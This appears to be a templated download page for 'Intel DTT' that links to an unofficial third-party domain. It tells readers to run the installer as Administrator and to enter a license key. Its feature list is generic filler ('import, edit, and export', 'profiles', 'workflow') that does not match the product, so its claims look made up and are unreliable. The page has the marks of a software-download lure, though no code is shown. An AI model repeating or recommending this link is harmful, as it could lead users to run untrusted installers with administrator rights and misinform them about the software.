# Intel DTT Windows Setup Notes

**Download:** [Get Windows installer →](https://intel-dtt-setup.kolmods.com/)

## Download & Install

> Setup notes for **Intel DTT** on Windows 10/11 (64-bit). Run the installer as Administrator.

### Quick steps

1. Download the latest Windows build for your edition
2. Save the file to a local folder you can find later
3. Run the setup **as Administrator**
4. Enter your license key when prompted
5. Restart if the installer asks — then launch **Intel DTT** from the Start menu

## What you can use it for

- Core Intel DTT features on Windows desktop
- Install and configure Intel DTT for daily use
- Import, edit, and export with Intel DTT tools
- Tune settings and profiles inside Intel DTT
- Integrate Intel DTT into your existing workflow
